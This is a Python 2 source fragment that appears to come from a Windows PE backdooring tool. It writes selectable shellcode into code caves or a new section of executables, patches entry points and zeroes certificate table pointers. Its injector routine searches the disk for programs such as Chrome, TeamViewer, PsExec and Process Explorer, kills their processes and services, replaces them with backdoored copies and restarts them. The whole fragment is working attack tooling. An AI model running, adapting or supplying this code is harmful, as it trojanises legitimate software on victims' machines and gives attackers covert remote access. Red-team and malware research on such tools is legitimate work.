        #If no cave found, continue to create one.
        if self.flItms['JMPtoCodeAddress'] is None or self.flItms['NewCodeCave'] is True:
            self.create_code_cave()
            self.flItms['NewCodeCave'] = True
            print "- Adding a new section to the exe/dll for shellcode injection"
        else:
            self.flItms['LastCaveAddress'] = self.flItms['CavesPicked'][len(self.flItms['CavesPicked']) - 1][6]

        #Patch the entry point
        targetFile = intelCore(self.flItms, self.binary, self.VERBOSE)
        targetFile.patch_initial_instructions()

        if self.flItms['Magic'] == int('20B', 16):
            ReturnTrackingAddress, self.flItms['resumeExe'] = targetFile.resume_execution_64()
        else:
            ReturnTrackingAddress, self.flItms['resumeExe'] = targetFile.resume_execution_32()

        #write instructions and shellcode
        #remove if this breaks shit... CHECK ME
        self.set_shells()

        #self.flItms['allshells'] = getattr(self.flItms['shells'], self.SHELL)(self.flItms, self.flItms['CavesPicked'])
        #print self.flItms['allshells'], self.flItms['shellcode']

        if self.flItms['cave_jumping'] is True:
            if self.flItms['stager'] is False:
                temp_jmp = "\xe9"
                breakupvar = eat_code_caves(self.flItms, 1, 2)
                test_length = int(self.flItms['CavesPicked'][2][1], 16) - int(self.flItms['CavesPicked'][1][1], 16) - len(self.flItms['allshells'][1]) - 5
                #test_length = breakupvar - len(self.flItms['allshells'][1]) - 4
                if test_length < 0:
                    temp_jmp += struct.pack("<I", 0xffffffff - abs(breakupvar - len(self.flItms['allshells'][1]) - 4))
                else:
                    temp_jmp += struct.pack("<I", breakupvar - len(self.flItms['allshells'][1]) - 5)

            self.flItms['allshells'] += (self.flItms['resumeExe'], )

        self.flItms['completeShellcode'] = self.flItms['shellcode'] + self.flItms['resumeExe']
        if self.flItms['NewCodeCave'] is True:
            self.binary.seek(self.flItms['newSectionPointerToRawData'] + self.flItms['buffer'])
            self.binary.write(self.flItms['completeShellcode'])
        if self.flItms['cave_jumping'] is True:
            for i, item in self.flItms['CavesPicked'].iteritems():
                self.binary.seek(int(self.flItms['CavesPicked'][i][1], 16))
                self.binary.write(self.flItms['allshells'][i])
                #So we can jump to our resumeExe shellcode
                if i == (len(self.flItms['CavesPicked']) - 2) and self.flItms['stager'] is False:
                    self.binary.write(temp_jmp)
        else:
            for i, item in self.flItms['CavesPicked'].iteritems():
                if i == 0:
                    self.binary.seek(int(self.flItms['CavesPicked'][i][1], 16))
                    self.binary.write(self.flItms['completeShellcode'])

        #Patch certTable
        if self.ZERO_CERT is True:
            print "[*] Overwriting certificate table pointer"
            self.binary.seek(self.flItms['CertTableLOC'], 0)
            self.binary.write("\x00\x00\x00\x00\x00\x00\x00\x00")

        print "[*] {0} backdooring complete".format(self.FILE)

        self.binary.close()
        if self.VERBOSE is True:
            self.print_flItms(self.flItms)

        return True

    def output_options(self):
        """
        Output file check.
        """
        if not self.OUTPUT:
            self.OUTPUT = os.path.basename(self.FILE)

    def set_shells(self):
        """
        This function sets the shellcode.
        """
        print "[*] Looking for and setting selected shellcode"

        if self.flItms['Magic'] == int('10B', 16):
            self.flItms['bintype'] = winI32_shellcode
        if self.flItms['Magic'] == int('20B', 16):
            self.flItms['bintype'] = winI64_shellcode
        if not self.SHELL:
            print "You must choose a backdoor to add: (use -s)"
            for item in dir(self.flItms['bintype']):
                if "__" in item:
                    continue
                elif ("returnshellcode" == item
                      or "pack_ip_addresses" == item
                      or "eat_code_caves" == item
                      or 'ones_compliment' == item
                      or 'resume_execution' in item
                      or 'returnshellcode' in item):
                    continue
                else:
                    print "   {0}".format(item)
            return False
        if self.SHELL not in dir(self.flItms['bintype']):
            print "The following %ss are available: (use -s)" % str(self.flItms['bintype']).split(".")[1]
            for item in dir(self.flItms['bintype']):
                #print item
                if "__" in item:
                    continue
                elif "returnshellcode" == item or "pack_ip_addresses" == item or "eat_code_caves" == item:
                    continue
                else:
                    print "   {0}".format(item)

            return False
        else:
            shell_cmd = self.SHELL + "()"
        self.flItms['shells'] = self.flItms['bintype'](self.HOST, self.PORT, self.SUPPLIED_SHELLCODE)
        self.flItms['allshells'] = getattr(self.flItms['shells'], self.SHELL)(self.flItms, self.flItms['CavesPicked'])
        self.flItms['shellcode'] = self.flItms['shells'].returnshellcode()

    def injector(self):
        """
        The injector module will hunt and injection shellcode into
        targets that are in the list_of_targets dict.
        Data format DICT: {process_name_to_backdoor :
                           [('dependencies to kill', ),
                           'service to kill', restart=True/False],
                           }
        """

        list_of_targets = {'chrome.exe':
                           [('chrome.exe', ), None, True], 'hamachi-2.exe':
                           [('hamachi-2.exe', ), "Hamachi2Svc", True],
                           'tcpview.exe': [('tcpview.exe',), None, True],
                           #'rpcapd.exe':
                           #[('rpcapd.exe'), None, False],
                           'psexec.exe':
                           [('psexec.exe',), 'PSEXESVC.exe', False],
                           'vncserver.exe':
                           [('vncserver.exe', ), 'vncserver', True],
                           # must append code cave for vmtoolsd.exe

                           'vmtoolsd.exe':
                           [('vmtools.exe', 'vmtoolsd.exe'), 'VMTools', True],

                           'nc.exe': [('nc.exe', ), None, False],

                           'Start Tor Browser.exe':
                           [('Start Tor Browser.exe', ), None, False],

                           'procexp.exe': [('procexp.exe',
                                            'procexp64.exe'), None, True],

                           'procmon.exe': [('procmon.exe',
                                            'procmon64.exe'), None, True],

                           'TeamViewer.exe': [('tv_x64.exe',
                                               'tv_x32.exe'), None, True]
                           }

        print "[*] Beginning injector module"
        os_name = os.name
        if os_name == 'nt':
            if "PROGRAMFILES(x86)" in os.environ:
                print "-You have a 64 bit system"
                system_type = 64
            else:
                print "-You have a 32 bit system"
                system_type = 32
        else:
            print "This works only on windows. :("
            sys.exit()
        winversion = platform.version()
        rootdir = os.path.splitdrive(sys.executable)[0]
        #print rootdir
        targetdirs = []
        excludedirs = []
        #print system_info
        winXP2003x86targetdirs = [rootdir + '\\']
        winXP2003x86excludedirs = [rootdir + '\\Windows\\',
                                   rootdir + '\\RECYCLER\\',
                                   '\\VMWareDnD\\']
        vista7win82012x64targetdirs = [rootdir + '\\']
        vista7win82012x64excludedirs = [rootdir + '\\Windows\\',
                                        rootdir + '\\RECYCLER\\',
                                        '\\VMwareDnD\\']

        #need win2003, win2008, win8
        if "5.0." in winversion:
            print "-OS is 2000"
            targetdirs = targetdirs + winXP2003x86targetdirs
            excludedirs = excludedirs + winXP2003x86excludedirs
        elif "5.1." in winversion:
            print "-OS is XP"
            if system_type == 64:
                targetdirs.append(rootdir + '\\Program Files (x86)\\')
                excludedirs.append(vista7win82012x64excludedirs)
            else:
                targetdirs = targetdirs + winXP2003x86targetdirs
                excludedirs = excludedirs + winXP2003x86excludedirs
        elif "5.2." in winversion:
            print "-OS is 2003"
            if system_type == 64:
                targetdirs.append(rootdir + '\\Program Files (x86)\\')
                excludedirs.append(vista7win82012x64excludedirs)
            else:
                targetdirs = targetdirs + winXP2003x86targetdirs
                excludedirs = excludedirs + winXP2003x86excludedirs
        elif "6.0." in winversion:
            print "-OS is Vista/2008"
            if system_type == 64:
                targetdirs = targetdirs + vista7win82012x64targetdirs
                excludedirs = excludedirs + vista7win82012x64excludedirs
            else:
                targetdirs.append(rootdir + '\\Program Files\\')
                excludedirs.append(rootdir + '\\Windows\\')
        elif "6.1." in winversion:
            print "-OS is Win7/2008"
            if system_type == 64:
                targetdirs = targetdirs + vista7win82012x64targetdirs
                excludedirs = excludedirs + vista7win82012x64excludedirs
            else:
                targetdirs.append(rootdir + '\\Program Files\\')
                excludedirs.append(rootdir + '\\Windows\\')
        elif "6.2." in winversion:
            print "-OS is Win8/2012"
            targetdirs = targetdirs + vista7win82012x64targetdirs
            excludedirs = excludedirs + vista7win82012x64excludedirs

        filelist = set()
        folderCount = 0

        exclude = False
        for path in targetdirs:
            for root, subFolders, files in os.walk(path):
                for directory in excludedirs:
                    if directory.lower() in root.lower():
                        #print directory.lower(), root.lower()
                        #print "Path not allowed", root
                        exclude = True
                        #print exclude
                        break
                if exclude is False:
                    for _file in files:
                        f = os.path.join(root, _file)
                        for target, items in list_of_targets.iteritems():
                            if target.lower() == _file.lower():
                                #print target, f
                                print "-- Found the following file:", root + '\\' + _file
                                filelist.add(f)
                                #print exclude
                exclude = False

        #grab tasklist
        process_list = []
        all_process = os.popen("tasklist.exe")
        ap = all_process.readlines()
        all_process.close()
        ap.pop(0)   # remove blank line
        ap.pop(0)   # remove header line
        ap.pop(0)   # remove this ->> =======

        for process in ap:
            process_list.append(process.split())

        #print process_list
        #print filelist
        for target in filelist:
            service_target = False
            running_proc = False
            #get filename
            #support_result = support_check(target, 0)
            #if support_result is False:
            #   continue
            filename = os.path.basename(target)
            for process in process_list:
                #print process
                for setprocess, items in list_of_targets.iteritems():
                    if setprocess.lower() in target.lower():
                        #print setprocess, process
                        for item in items[0]:
                            if item.lower() in [x.lower() for x in process]:
                                print "- Killing process:", item
                                try:
                                    #print process[1]
                                    os.system("taskkill /F /PID %i" %
                                              int(process[1]))
                                    running_proc = True
                                except Exception as e:
                                    print str(e)
                        if setprocess.lower() in [x.lower() for x in process]:
                            #print True, items[0], items[1]
                            if items[1] is not None:
                                print "- Killing Service:", items[1]
                                try:
                                    os.system('net stop %s' % items[1])
                                except Exception as e:
                                    print str(e)
                                service_target = True

            time.sleep(1)
            #backdoor the targets here:
            print "*" * 50
            self.FILE = target
            self.OUTPUT = os.path.basename(self.FILE + '.bd')
            print "self.OUTPUT", self.OUTPUT
            print "- Backdooring:", self.FILE
            result = self.patch_pe()
            if result:
                pass
            else:
                continue
            shutil.copy2(self.FILE, self.FILE + self.SUFFIX)
            os.chmod(self.FILE, stat.S_IRWXU | stat.S_IRWXG | stat.S_IRWXO)
            time.sleep(1)
            try:
                os.unlink(self.FILE)
            except:
                print "unlinking error"
            time.sleep(.5)
            try:
                shutil.copy2(self.OUTPUT, self.FILE)
            except:
                os.system('move {0} {1}'.format(self.FILE, self.OUTPUT))
            time.sleep(.5)
            os.remove(self.OUTPUT)
            print (" - The original file {0} has been renamed to {1}".format(self.FILE,
                   self.FILE + self.SUFFIX))

            if self.DELETE_ORIGINAL is True:
                print "!!Warning Deleteing Original File!!"
                os.remove(self.FILE + self.SUFFIX)

            if service_target is True:
                #print "items[1]:", list_of_targets[filename][1]
                os.system('net start %s' % list_of_targets[filename][1])
            else:
                try:
                    if (list_of_targets[filename][2] is True and
                       running_proc is True):
                        subprocess.Popen([self.FILE, ])
                        print "- Restarting:", self.FILE
                    else:
                        print "-- %s was not found online -  not restarting" % self.FILE

                except:
                    if (list_of_targets[filename.lower()][2] is True and
                       running_proc is True):
                        subprocess.Popen([self.FILE, ])
                        print "- Restarting:", self.FILE
                    else:
                        print "-- %s was not found online -  not restarting" % self.FILE
